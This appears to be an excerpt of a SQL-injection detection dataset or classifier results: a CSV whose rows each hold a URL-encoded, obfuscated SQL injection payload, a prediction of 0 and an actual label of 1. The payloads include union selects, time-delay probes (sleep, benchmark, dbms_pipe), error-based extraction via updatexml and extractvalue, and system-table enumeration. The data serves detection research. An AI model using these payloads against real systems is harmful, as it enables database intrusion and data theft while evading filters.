,Query,Prediction,Actual
6518,e%6ed%20AND %31 a%4eD 1 &%26  %20 %28  %20 (%20  %20'zlsq%27+2*3-6+8-8%3d'%7al%73q+8%2d8%2b2/%32-%31 ,0,1.0
6519,1'+ %20( %20s%65lect %27l%75h%79' %77h%65re %200+%3311%32+%32*%33-6%2bSI%4e(0%29+%30+%32/2-1%3d8-%38+%32*3-%36+311%32+%38-%38 aNd%201 AN%44 %20 (   8-%38+3%302%30+%53I%4e(0%29=%53I%4e(0)%2b3020%2b2/%32-%31+2/%32-1 %20)  *%36703%20 ) %20+%27 ,0,1.0
6520,"%2d5%306%34  )%20  as%20mzxc whe%72e  S%49N(%30)+%53IN(0%29+2%2f2-1%2b1889%2b2%2f2-%31=%53I%4e(0%29+SIN%280)+18%389%20o%72 2*%33-%36 OR%202/%32-1%20Or  8-8+SIN(%30)+%53IN(%30)+2%2f2%2d1+%3157%30+0%3d2/%32-1+2*%33-6%2b2%2a3%2d6%2bconv%65r%74+0  (%20 i%6et,  (  %73ele%63t %63ha%72  %28  11%33  %29 %20+%63ha%72  (%20 %311%33  ) %20+c%68ar %20(%20 1%312  %29 %20+%63har %20(  %3106%20 %29  +c%68a%72  ( %201%313  ) %20+%20 %28 %20select%20  %28 %20c%61se%20when%20  (%20 %2015%370%2b8%2d8+2/%32-1=0+1%3570+2*3-6%2b2%2f2-1+%32*%33-6%2b0  %29  %20then %63h%61r%20 ( %2049%20 )%20  e%6cse%20cha%72  (  %348%20 )%20  %65nd%20 %20)%20 %20 %29 %20 +c%68ar%20 %28 %201%313%20 )%20 +cha%72  %28 %201%322  ) %20+%63ha%72 %20(  %311%38 %20) %20+%63h%61r %20(  12%32  )  +c%68ar%20 %28  1%313  %20)   %20) %20  %20)%20 %2d- ",0,1.0
6521,1%27 %20 ) %20  )%20 %20 a%4ed 1 AND%20 %38-%38+285%33+0=%30+cas%74+%38-8+%30+%32/2-%31  %20(%20   (%20 %20c%68r%20 %28 %2011%33  ) %20|%7cc%68r  %28 %20113%20 %29 %20||%63h%72  (%20 %311%32  %29 %20||ch%72  %28 %201%306%20 )%20 %7c|chr %20(%20 %311%33   %29 %20  ) %20 %6fr%200%20||%20 ( %20s%65lec%74  %20(%20 %63as%65 %77he%6e  %20(   %328%353%2b0%2bSI%4e(0%29+%32/%32-1%2bS%49N%280%29=%32/%32-%31+2%3853+%30  %29  %20th%65n%201%20els%65 0%20e%6ed %20 %29 %20 %20)  %20:%3ate%78t%7c| %20(%20 %63h%72  %28  %3113%20 %29  |%7cch%72  %28 %201%322%20 )%20 ||c%68r %20(  %311%38  %29 %20||%63h%72  (%20 122%20 %29 %20|%7cc%68r %20( %2011%33   )%20 %20 )  %20 as nu%6de%72i%63  ) %20 %61nd %20  (%20 %20 %28   %20'esa%6c'+%32*3-%36+0%2b2%2f2-%31=%30+2%2a3%2d6%2b'e%73a%6c+%32/%32-1+2/%32-1 ,0,1.0
6522,%31%%27   %29    %29 %20 %20a%4ed%201 %41nd%20 S%49N(%30)%2bS%49N%280)+%3370%37+8%2d8%3dS%49N%280)%2b8-8%2b(%2bS%49N(%30)+%38-8%2b2%2a3-%36 %20s%65le%63t %63o%75nt%20 %28 %20* %20)   fro%6d sy%73i%62m.sys%74abl%65s %61s t1%2csysi%62m.sys%74a%62l%65s%20a%73 %742%2csy%73i%62m%2es%79s%74a%62l%65s as %743  %29   %61nd    (%20 %20 %28 %20 %20S%49N%280)%2b0%2b'%'+%38-8%2b2%2a3-%36+%32*%33-6%3d8-8%2b0+%32/2%2d1%2b'+0+%32*3-%36 ,0,1.0
6523,-%31436'%20O%72 2%2a3%2d6%20O%52 %32*3%2d6%20or 8-8 o%52 %202*3%2d6%2b56%399+0=%35783-%2d+%32*%33-6%2b8%2d8+0 ,0,1.0
6524,"%2d103%33 u%6eion%20al%6c s%65lect 873%31,%387%331,8%3731%2c8%3731,%3873%31,%387%331-%2d ",0,1.0
6525,-4%3572' %20)  %20u%6ei%6fn%20a%6cl %73e%6cect%2035%320%2d-%20,0,1.0
6526,%31 %22 wh%65re%20 2*%33-%36+S%49N(0%29+%325%312%2bSI%4e(0%29+S%49N(%30)%3d2*%33-6+%325%312%2b2%2f2%2d1+%32*%33-%36 %4fr%208%2d8%20OR%208-%38 %7c|  2%2a3%2d6%2b7417+2*3-6%2b2*3%2d6%3d0%2b2%2a3-%36+0+(+0%2b8-8%20 %73el%65ct%20c%6fun%74 %20(%20 %2a  )%20  from s%79sib%6d.s%79s%74ab%6ces %61s %741%2cs%79s%69b%6d.sys%74a%62les a%73 %742%2csy%73ib%6d.s%79s%74a%62le%73 %61s %743  %29 %20-%2d ,0,1.0
6527,%2d8%305%36 %20 %29  %20 %29 %20  a%73 b%6ftl whe%72e  S%49N(%30)+%392%325+2%2f2-1+%30+2/%32-1=%32*3-%36+%3922%35+%53I%4e(0) O%52 2/2%2d1 %7c| 2%2a3%2d6%20Or %20 (%20 %200+%32*3-%36+%38-8%2b1%3182%2b2%2a3%2d6=%376%341%2b0%2bSI%4e(0) %20) %20*%37641-- ,0,1.0
6528,"%31'+  ( %20s%65le%63t jle%79 %77her%65  %33581%2b0%2b8-8+%53IN(0%29+%30=%335%381+%38-8+2*%33-%36+%30+2%2f2-%31 a%4ed%201%20AND %202%2a3%2d6%2bSIN(0)%2b23%388%3d2%2a3-%36+%62en%63h%6da%72k%2b2%2a3%2d6 %20(%20 5%3000%3000,md%35  (%20 0%786d457%315%33 %20 )%20   )   #%20",0,1.0
6529,"%2d9%322%37  ) %20 %77he%72e%20 6%372%33+2%2a3%2d6+%32*%33-%36+%30+%32/2%2d1%3d2%2a3%2d6%2b6723+2%2f2-1%20u%6ei%6fn %61l%6c se%6cec%74 6%372%33,67%323,%36723,%367%323%2c6%372%33,%3672%33,6%372%33,6%3723%2c672%33,%367%323%2d-%20",0,1.0
6530,"%31 a%4eD%201%20An%64 %75p%64atex%6dl  %28 %2033%393,co%6ecat %20(%20 0%782%65,%30x%371717%306a7%31, %20(  %73e%6ce%63t  %20(%20 el%74  %28 %20 %3339%33+0+2/2%2d1%2b0%3d0+%30+3%339%33,%31+0%2b2*3-%36  %20)%20 %20 )%20 %20 %20) %20,0%787%317%6176%37a%371%20 )%20 ,%31161%20 %29  %20",0,1.0
6531,%31 %22 wh%65r%65 %208%2d8%2b0+%38-%38+8-%38+%53I%4e(0)%2b2%361%39=%30+2%2a3-%36+8-8+2619+0+8%2d8%20a%4ed %31 a%4ed%20 2/%32-1+%30+%328%323+%32*3-6%3d8%2d8+%32*%33-%36+%32/2-%31+%3510%30+2%2f2%2d1%2b0%20#,0,1.0
6532,1' %20) %20 w%68ere%20 0%2b233%30+%32*3-6%2b8-8=S%49N%280)+2/%32-1+2%3330%2b2/%32-1+%32*%33-%36 A%6ed 1 %61ND 1 A%6ed%20 %20(  %73el%65c%74 %2a %66rom  %20( %20s%65l%65c%74  (  s%6cee%70 %20( %205 %20 %29   %20) %20  %20) %20f%7an%6f %20)  %2d-%20,0,1.0
6533,"m%61k%65_s%65t %20( %20 %38-8%2b0+%361%374=0%2b2%2a3%2d6+%32*%33-%36+9%373%34,1 %20)%20  ",0,1.0
6534,1'|%7c %20( %20s%65le%63t%20'%75s%73i%27 %77h%65re%20 %389%358%2b8-%38+%32/%32-1=2*3-6%2b8%3958%2b8%2d8%2b0%2b2/2-1 ,0,1.0
6535,"%31' %20)%20 %20a%6ed %31 %61n%64 %65lt  (   %30+2/%32-1%2bSIN%280)%2b8%2d8+%375%354+2*3-%36=6%325%37,%362%357+2/2-1%2bS%49N(0%29  )%20  %61nd   (%20 %20'b%70zm'%2bSI%4e(0%29+2%2f2-1%2b2*%33-%36=%27bpzm%2bSIN(0%29+%30 ",0,1.0
6536,"1%20""  %29 %20 %7c| %32*3-%36 %4fr%208-8%20or%202/2-1%20O%72  8%2d8+7%342%37+0+%30+%32/%32-%31+8%2d8%3d2%2a3-%36+8%2d8%2b2/2-%31+dbms_%70i%70e%2ere%63e%69v%65_%6de%73sage+%38-8%2b2*%33-6 %20( %20ch%72 %20(%20 11%36  %29  ||ch%72  (  87 %20)%20 %7c|%63hr%20 %28 %2090  %29 %20|%7cc%68r%20 (%20 1%309%20 %29 %20,%35  )%20 %2d- ",0,1.0
6537,"%31 "" wh%65r%65  7110%2bSI%4e(0)+2*3%2d6+2%2a3-6%3d7%3110%2b0+2/%32-%31 ",0,1.0
6538,"1%20"" %77h%65re  %32/2-%31+2%2a3%2d6%2b8%2d8+4%3652+2*%33-6%2b0=46%352%2b2*3-%36+2%2a3%2d6 AND%201 aND  2%2f2%2d1+SI%4e(0)%2b3%3202=%30+SI%4e(%30)%2b2%2a3%2d6+l%69ke+SIN%280)%20 (%20 %27a%62c%64e%66g'%2cup%70er  %28 %20h%65x%20 %28  r%61nd%6fm%62l%6fb%20 %28  50%30000000/2%20 %20)   %20)%20  %20 %20)   %20)%20 %20-%2d ",0,1.0
6539,"-5%331%37' %20 %29 %20 %20)%20  %20u%6ei%6fn %61ll %73e%6ce%63t%207%367%33,7%3673%2c7%3673%2c767%33,%37673%2c7%367%33# ",0,1.0
6540,1'||%20 %28 %20sele%63t '%79wj%79' %77her%65 %202%2a3%2d6%2b2*%33-%36+%38-8+%375%379%3dS%49N%280%29+757%39+2%2a3-6%20,0,1.0
6541,%31 %20) %20 %77her%65 %20S%49N(%30)%2b9%3010+0%2bSI%4e(%30)=8-%38+9%301%30+2/%32-%31+2%2f2-1 aN%44 1 %61Nd%20 2*%33-%36+%53I%4e(%30)+%53IN(%30)%2b85%314=%32/%32-%31+2%2a3%2d6%2b(%2b0%2b8-8 %20se%6ce%63t count  (  *%20 %29  %20f%72o%6d %64o%6dai%6e.d%6fmains %61s %741%2cdom%61i%6e.%63olu%6dns%20a%73 %742%2cd%6fma%69n.%74ab%6ces%20a%73 %743%20 %29 %20--%20,0,1.0
6542,1%25'%20  %29  %20 ) %20 %20or %32/2%2d1%20OR%20 0%2b2%2a3-%36+%3831%35+%30+0%2bSIN%280%29=2*3%2d6%2b2%2a3%2d6+2%2a3-6%2b2%2f2-%31+%28+2/2-%31  %73el%65c%74 c%6fu%6et %20( %20*%20 ) %20 %66ro%6d %73ys%69b%6d.%73y%73tabl%65s %61s %741%2csys%69bm%2es%79s%74ab%6ce%73 %61s%20t2%2cs%79sibm.%73yst%61bl%65s%20a%73 %743  %29   a%6ed%201%20aN%64 %31 An%64 %20  (%20 %20 %28  %20 %32/%32-%31+%32/2-1+2*%33-%36+2/2-%31+%32/%32-1+%27%'=%32/%32-1+%27+%32*%33-%36 ,0,1.0
6543,"-6%3254%'   %29  %20 %29    %20)%20  o%72 2/2%2d1 Or%202/%32-%31 oR%201 gr%6fu%70 by c%6fnca%74 %20( %200%787%317%317%306a7%31,  %28  %73e%6cec%74 %20 ( %20case%20w%68e%6e   %28 %20 %32/%32-%31+%32*3-%36+2%2a3%2d6+%34232%2b2%2a3%2d6+%38-8%3d2*3-6+%32*3-6%2b2%2a3%2d6%2b42%332%2b2%2f2-1+%32/2%2d1 %20)%20 %20the%6e 1%20el%73e %30 en%64 %20 %29  %20 )   ,0x7%317%6176%37a71,fl%6for  %28 %20r%61n%64 %20(  0%20 )  %2a2%20 %20)%20 %20 %29    ha%76ing%20m%69n%20 (  %30  %29 %20# ",0,1.0
6544,"%31%%27 %20)%20  u%6ei%6fn%20all se%6cec%74 %6eu%6cl%2cn%75l%6c,nu%6cl#%20",0,1.0
6545,1%27 %77he%72e %202/%32-1+%32*%33-6+0+%35819%3d0+%32/2-%31+%358%319%20A%6ed %31 aN%64  %20( %20 %53IN%280)+%31275+%53I%4e(0%29=%38-%38+4759+2%2f2-1  ) %20*%3475%39--%20,0,1.0
6546,1%27 r%6ci%6be%20  %28  s%65le%63t   %28 %20ca%73e%20w%68e%6e  %20(%20 %200+0+685%35+%53I%4e(0)+%32/%32-1+2/2-1%3d2%2f2%2d1%2b1%305%36+%53I%4e(0)%20 %29 %20 %74he%6e 1 %65l%73e%200%7828%20e%6ed   )%20   )%20   %41ND%201%20AN%44 %31 %41ND '%70m%72z%27 lik%65 %27pm%72z ,0,1.0
6547,"1%27 pro%63e%64ure%20an%61l%79s%65  (%20 %65x%74r%61c%74v%61l%75e%20 (%20 %3925%35,co%6ecat%20 (  %30x5c%2c  %28  b%65nchm%61rk%20 %28 %205%300000%30,%6dd%35 %20(  %30x5%325%315a50%20 %20)%20  %20)%20 %20 %20 %29    %29 %20 %20 %29 %20,%31  ) %20 ",0,1.0
6548,"1%20"" an%64 %31 a%6ed 1%20A%4eD%20 %53I%4e(0)+8%2d8+2%2a3%2d6%2b42%341%2b2%2f2-1+8-8=SIN(%30)%2bc%6fn%76er%74+%53IN(0)%2bS%49N%280%29+%32/%32-%31  ( %20in%74,  %28  %73ele%63t char %20(%20 %311%33 %20)%20 +%63ha%72 %20(%20 %311%33  )  +ch%61r  %28  1%312  %29 %20+c%68a%72 %20(%20 %3106  )%20 %2bcha%72  %28 %20113%20 )%20 +%20 ( %20se%6cec%74  %20(%20 %63as%65 %77h%65n %20 %28 %20 %30+0%2bS%49N(0)+%32*%33-%36+%342%341+%32/2-1%3d2%2f2-1+8-8+4%3241+2%2f2-%31  )%20 %20t%68e%6e %63h%61r%20 ( %204%39 %20)%20 %20e%6cse %63h%61r%20 %28 %204%38 %20)%20 %20en%64 %20 %29 %20  %29 %20 +%63ha%72 %20(%20 %3113  )%20 +%63har%20 %28 %20122  %29 %20+ch%61r%20 %28  %311%38 %20)  %2bc%68ar%20 (%20 %3122 %20)%20 %2bcha%72  %28  %311%33   )%20  %20) %20 %20 %29  %20a%6ed  %22v%7au%64 ""%20li%6be %20""%76z%75d ",0,1.0
6549,1 %20 %29   %20)%20  %20a%73 %73y%6ft wh%65r%65  2%2f2-1+%3119%39+%32/2-1%2b2%2a3%2d6%3d119%39+8%2d8+%32*3%2d6+%30+2%2a3-%36 ,0,1.0
6550,"i%69f %20(  %202/2-1%2b8%2d8+%53I%4e(0%29+2*%33-%36+109%35=%32*3%2d6+%53I%4e(%30)%2b2*3%2d6%2b285%33,%31,%31/0%2b8%2d8%20 %29   ",0,1.0
6551,"%31 %22 %20)%20 %20Or%200 %4fR%20 %20(  sele%63t%20* f%72o%6d %20 %28  %73ele%63t %20(%20 %73l%65e%70 %20(%20 5 %20 )%20 %20 %29 %20 %20 )%20 y%64p%75 %20)%20 %20a%6ed 1%20A%6ed %20 %28 %20 ""g%69xv ""%200%2b2%2f2-1+%53I%4e(%30)+%2b2%2f2%2d1%2bS%49N%280%29=%53I%4e(%30)%2b+%38-%38 %22g%69xv%20",0,1.0
6552,%31  ) %20 wh%65r%65 %20SIN(0)%2b9%3821+0+%32/2-%31=%32/2-1+%53IN(0%29+%39821%2b2/2%2d1 %4fr SIN%280)%20OR %20 %28 %20s%65l%65ct %2a %66ro%6d   %28  s%65le%63t  ( %20s%6ceep %20( %205 %20 %29 %20 %20)%20  %20 ) %20sdd%6f %20)%20 %23 ,0,1.0
6553,s%65le%63t   (%20 c%61se%20wh%65n   %28 %20 8%2d8%2b2%2f2-%31+471%39+0%2bS%49N%280%29=8%2d8+%32/%32-1+0%2b8%3852%2b2*3-%36+%53IN(0)%20 %29 %20 th%65n%201 e%6cse 4%3719*%20 (%20 %73elect%204%3719%20f%72om%20m%61s%74er%2e.sysd%61taba%73es%20 %29   en%64  %29  %2d- ,0,1.0
6554,"%31 ""%20 %20)  %20 %29 %20  %20) %20 %75n%69on%20a%6cl %73e%6ce%63t %6eull,nul%6c,%6eul%6c#%20",0,1.0
6555,"1'%20O%72 %38-8%20o%72 2%2f2%2d1%20o%72   %28 %20s%65lec%74 %32*  %28  %69f   %28   %20(   s%65le%63t * f%72o%6d %20 ( %20sel%65c%74 conc%61t%20 %28 %200%787%317%3170%36a71%2c  ( %20sele%63t%20  (  elt  %28  %200%2b8%3113%2bSIN(%30)%2bSI%4e(0)%2b0%3d0%2b2*3%2d6%2b81%313%2c1 %20 %29 %20 %20) %20 %20 )%20 %2c0%787%317a%376%37a%371,0x7%38  %20)  %20 )  %20s %20)%20 , %384467440737095%351%3610, %384%3467%3440%373%370955%316%310%20  )  %20 )     )%20  %61nd%201%20an%64 'qvy%71'%20li%6be%20'qvyq ",0,1.0
6556,"%31'%20pro%63edu%72e%20a%6ealy%73e %20(  %65x%74rac%74v%61lue%20 %28  9255,%63o%6ecat%20 %28 %200x5c%2c  ( %20b%65nc%68m%61r%6b %20(  5%300%300%300%2cm%645%20 %28 %200x%352%3515a50%20 %20) %20  %29 %20  %20 %29  %20 )  %20  %29 %20,%31  )%20  a%4ed 1 a%4ed %200+'z%6cx%77'%2b8-%38+2*%33-6%2b8%2d8=%38-8+0+'%7alx%77+0%2bS%49N(%30) ",0,1.0
6557,%2d8%329%32%'  ) %20 OR %32/2-1%20O%72 %30 o%72 %38-%38 o%72 %208%2d8+%385%371+%32/%32-1%3d0+%53IN(0)+8571%2d-%20,0,1.0
6558,"1%25' %20 %29   %20)%20  %20O%52 2%2f2%2d1 %4fr %38-8 %4fr %202/2%2d1%2b4%3411+%38-8%2b0%2b8%2d8%2b8-%38=2/2%2d1%2b2*3-%36+%30+%53I%4e(%30)%2bSI%4e(%30)+(%20 s%65l%65c%74 c%6fun%74  ( %20*%20 )%20  %66rom%20sy%73users%20a%73 %73ys%31,sy%73u%73e%72s a%73 %73ys2%2csy%73u%73e%72s %61s %73y%733%2cs%79su%73e%72s as%20sys4%2csysuse%72s %61s%20sy%735,s%79s%75se%72s%20a%73 sy%736,%73y%73user%73 %61s%20sys7%20 %29 %20 AND 1 AND 1 aND%20  %20( %20  %28 %20  2%2a3-%36+%38-%38+%27%%27+S%49N(%30)+%32/2-1%3d8-%38+0+8%2d8%2b2/2%2d1%2b'%20",0,1.0
6559,"%2d5%3728 %20) %20 w%68e%72e %202%2a3%2d6+%386%363%2b8%2d8%2b8%2d8%2bS%49N(0)%3d2*%33-6%2b86%363%2bSIN%280%29 unio%6e %61l%6c sel%65ct 8%3663,%386%363%2c8%366%33,%386%363%2c866%33,8%366%33,8%3663,8%366%33,8663,86%363%23 ",0,1.0
6560,"%31 ""%20 %29  %20whe%72e%20 %38-%38+8-%38+%38-%38+%32/%32-1%2b41%380%3d8%2d8%2b2%2a3%2d6+%3418%30+%38-%38+%38-8%20o%72 %32*3%2d6 OR%20ch%61r%20 %28 %206%38 %20)%20 %7c|c%68ar%20 %28 %2069 %20)  ||%63ha%72 %20( %209%37 %20)%20 ||ch%61r %20(%20 %385%20  2%2f2-%31+2/2%2d1+%32/%32-%31+)%2bS%49N(%30)%2bS%49N(%30)%3dre%67ex%70_subst%72i%6eg%2b0+%32/%32-%31  %28  %72e%70e%61t  %28  ri%67h%74  %28 %20ch%61r %20(%20 %353%389%20 %29 %20,0%20 )  ,5%3000%300%300%300%20 %29 %20,null  )%20 %2d- ",0,1.0
6561,"%31% %22 O%72 8%2d8%20o%52 %53IN(%30) Or %208%331%35+0+2%2a3-6=2%2a3-6%2b2/2%2d1%2b(%20 %73e%6cect%20cou%6et  (  * %20)   fr%6fm s%79s%69bm%2esystabl%65s%20as%20t%31,s%79s%69b%6d.%73y%73tabl%65s%20a%73 t%32,%73ysibm%2esy%73ta%62l%65s %61s t3%20 %29   a%4ed %31 %61n%64 1 a%6ed %20""%25 %22 2%2a3%2d6+%32/2-1+%2b0%2b0+SIN(%30)%3d2%2f2-1%2b+%32/2-%31+SI%4e(%30)+%32/%32-%31 %22 ",0,1.0
6562,"%31 ""%20 %29 %20 a%73 %68hx%78 %77he%72e  2*3%2d6%2b8%2d8+%333%372%2b0%3d337%32+2*%33-%36+SIN(0) %6fr%202/%32-1%20Or%208-%38 %6fr c%68ar%20 %28 %20117 %20)%20 %7c|%63h%61r  (%20 11%31 %20)%20 %7c|c%68a%72  %28 %201%305%20 %29  |%7ccha%72 %20(%20 %310%30 %20 S%49N(0%29+%29+0%3d0+%32/%32-%31+%72eg%65xp%5fs%75b%73t%72i%6eg+%32*3-%36+%53I%4e(0)%2b2%2a3-%36  %28  repe%61t%20 (  %6ce%66t%20 %28 %20cr%79p%74_%6be%79 %20(%20 c%68ar%20 (%20 %365  ) %20||%63h%61r%20 %28  69%20 %29  ||char%20 %28 %2083%20 %29 %20,%6eu%6cl%20 )  %2c0%20 %29 %20,%350%300%300%300%30 %20)  ,%6eul%6c %20)  %2d-%20",0,1.0
6563,"%31 ""%20 )%20  o%52 %30 %6fr %38-8 %7c| %200+2%2a3-%36+%32/%32-%31+%3842%31+8-8%2b2/2-1=S%49N(%30)+2*3%2d6%2b(%2b8-8+8-%38+2%2a3%2d6  se%6cect%20co%75n%74 %20( %20*%20 )   %66ro%6d %67e%6eer%61t%65_%73e%72i%65s  %28  %31,50%300%3000 %20 )%20  %20)%20 %20 %61Nd 1 &%26 1%20aND %20 (%20  %22r%7aj%61 ""%20l%69ke%20 %22r%7aj%61 ",0,1.0
6564,"%31 ""%20  ) %20 %20)%20 %20  %29 %20 %41N%44 %31 %26&%201%20a%6ed%20 2%2a3-%36+%3542%39+2/2%2d1+%32/2%2d1=%53I%4e(0)%2b8%2d8+959%36+%38-%38 ",0,1.0
6565,"-3541 %22 %7c| S%49N%280)%20||%20SI%4e(%30)%20Or m%61k%65_%73e%74 %20( %20 %32*%33-6+%38-8+%393%354%2b2/2%2d1%3d2%2f2-%31+S%49N(%30)%2bSIN(0%29+%38-%38+%53IN%280%29+9354%2c718%35 %20)  %20A%4eD%201 aND%20 ""%66g%78u ""%202*%33-%36+S%49N(%30)++2/%32-%31+%32/2-%31+%30=%32*%33-6+%38-8+2*%33-6%2b+%32*%33-6+8-8 %22fgxu%20",0,1.0
6566,"-%3658%30'%20 %29  %20u%6eion%20a%6cl%20sel%65c%74 %399%350%2c9%395%30,9%395%30,%399%350,%39950,9%395%30-- ",0,1.0
6567,"-43%350%20""%20  )%20 %20 %29 %20 %20a%73 %6dmw%71 %77h%65re %200+%32*%33-%36+%398%301%3dS%49N%280)%2b9%380%31+S%49N%280)+%53IN(0) O%72 %32*%33-%36 OR%20 %20(%20  2%2f2%2d1%2b2%2a3%2d6%2b8%2d8%2b85%320%3d0%2b2/%32-1+2%383%34+2%2f2-%31 %20)  *2%383%34-%2d ",0,1.0
6568,%2d1%348%35' %20)%20  %6fr%200 %6fr 0 %6fR   ( %20 %32/%32-%31+2%2f2-1+2%2a3%2d6+20%356%2b0%3d4%300%38+%32*3%2d6+%30 %20)%20 %2a40%308%20a%4eD%201 A%6ed%20  ( %20 %32*3%2d6%2b'%76p%68j'+%38-8%2b2*3-%36+0%3d0%2b2%2f2%2d1+'%76p%68j%20,0,1.0
6569,%31'  %29 %20 o%72de%72 %62y %31-%2d ,0,1.0
6570,"-%3238%34'||  %28 %20selec%74 %27v%68cp%27 %66r%6fm%20d%75al %77he%72e  2*3-%36+2%2a3-6%2b1%326%36=2%2f2-%31+%31266+S%49N(%30)+0 un%69o%6e %61ll%20se%6cec%74 %31266,%31266%2c126%36,%312%366%2d-%20",0,1.0
6571,"-%3735%30'%20  %29  %20 ) %20  %20)%20  u%6eion a%6cl sele%63t%209%3207,9%3207%2c92%307%2c92%307%2d-%20",0,1.0
6572,%31 %72l%69k%65 %20 %28  %73e%6ce%63t * %66r%6fm%20 %20(  %73e%6cec%74 %20(%20 %73lee%70  %28  %35 %20 %29  %20 %29 %20  %20) %20vw%79q%20 %29 %20#%20,0,1.0
6573,"1 "" %41nd%201 %61N%64 char%20 ( %201%311  )%20 %7c|ch%61r  (%20 %377  )%20 ||%63h%61r %20( %201%321 %20)%20 |%7ccha%72  %28 %2088%20 %202%2f2-1+%29+0%2bS%49N(0%29+0%3dSIN%280%29+0+regexp%5fs%75bstr%69n%67 %20(%20 %72ep%65at%20 (%20 %6ce%66t%20 (%20 cr%79p%74_k%65y%20 %28 %20ch%61r  (  %365  %29 %20||char%20 (  %369%20 %29  ||c%68a%72  %28 %2083  )%20 %2cn%75ll%20 ) %20,%30 %20)%20 ,50000000%30 %20) %20,%6eul%6c %20) %20 ",0,1.0
6574,"1%20An%64 %31 a%6ed 1 %41nd%20u%70d%61tex%6dl %20(%20 %33393,conc%61t%20 %28 %200x%32e,%30x%371%371%3706a7%31,  %28 %20se%6cec%74 %20 (%20 %65l%74  %28 %20 %3339%33+%53IN%280%29+%32/%32-1=%38-8+2*%33-%36+33%393%2c1%2b8%2d8%2bS%49N%280%29 %20 %29   %20)%20 %20  )%20 %2c0x%3717%6176%37a%371%20 )%20 ,116%31 %20) %20-%2d %6dw%73m ",0,1.0
6575,%2d186%36'%20  %29 %20  %29  %20 a%73 %63w%74v%20wh%65r%65  %32/%32-%31+%3329%35+%53I%4e(%30)%2bS%49N%280)+2%2a3-%36=%53IN%280%29+2*3%2d6%2b3%3295%2b2%2a3-%36+8%2d8%20o%72d%65r %62y 1-%2d ,0,1.0
6576,"%31 %20)   %61s%20z%71xa %77he%72e%20 %32*%33-6+%357%318%2b0%3d8%2d8+8%2d8+%3571%38+2*%33-%36+2%2a3%2d6%2b8%2d8%20aND%201 %41nd  %32/2-1+35%380+8-8+8-8+2/%32-%31=8%2d8+%28+%53IN(0%29 %20s%65l%65ct c%6fu%6et %20(  %2a  ) %20 f%72om d%6fmai%6e.%64o%6da%69ns %61s%20t%31,%64om%61in.co%6cu%6dns a%73 %742,%64om%61in.t%61ble%73 %61s%20t%33  %29  -- ",0,1.0
6577,"-205%34% %22 %20 %29  %20 %29 %20 %20 %29  %20o%72 %32*%33-6%20Or 2%372%34 %69n  %20 %28  %20 (%20  %63har%20 %28  %3113%20 ) %20+char%20 %28  1%313 %20)%20 %2bch%61r %20(%20 1%312 %20) %20+c%68ar%20 (  %310%36  )%20 %2bc%68ar%20 %28 %201%313%20 %29 %20+%20 (%20 %73el%65c%74  %20(%20 c%61s%65 %77h%65n%20  %28  %200%2b0+2%3724%2b2/%32-%31+0%3d2*%33-%36+SIN(%30)+2%3724+8-%38+2/2%2d1  ) %20 then%20c%68ar%20 %28 %2049%20 ) %20 %65lse %63har%20 (  48%20 %29  %20e%6ed %20 )  %20 %29   +%63h%61r  (%20 %311%33 %20)%20 +c%68a%72 %20(%20 122 %20)%20 %2bchar%20 (%20 %311%38  %29  +%63har %20(  1%322%20 %29  +char  %28 %201%313%20 %20) %20 %20)%20 %20  %29  %20a%6ed %31 A%6ed%201%20aN%44    (  %20 %28     ( %20 ""%%20""%200+%53I%4e(0%29++8-8%2b2%2a3%2d6%3d2/%32-%31+%38-%38+%2b0 ""%20",0,1.0
6578,"1 "" %20)%20  %20(%20 se%6ce%63t%20  ( %20cas%65 %77hen %20 (%20  %30+%3458%37+0=%38-8%2bS%49N(%30)%2b458%37 %20)%20 %20then%20r%65ge%78p%5fs%75bstri%6eg  ( %20rep%65at%20 %28  %6ceft%20 %28 %20cry%70t_k%65y %20( %20char%20 ( %206%35 %20) %20||%63ha%72  %28  %369%20 )%20 ||%63h%61r  %28  8%33  ) %20,nul%6c  %29  ,%30 %20)%20 %2c5%300%30000%300  %29  %2cnul%6c %20)%20 %20els%65 cha%72 %20(%20 %376%20 %29 %20||%63ha%72 %20(  6%35  %29 %20||%63h%61r  %28  1%302%20 )%20 %7c|cha%72  %28  %372 %20)%20  %65nd  ) %20 fro%6d  %20(  %76alue%73  (  0%20 %20) %20  )  %20  )%20  %61n%64 %31 %61ND  %20( %20 %22u%73h%74 "" %6ci%6be %20""%75sh%74 ",0,1.0
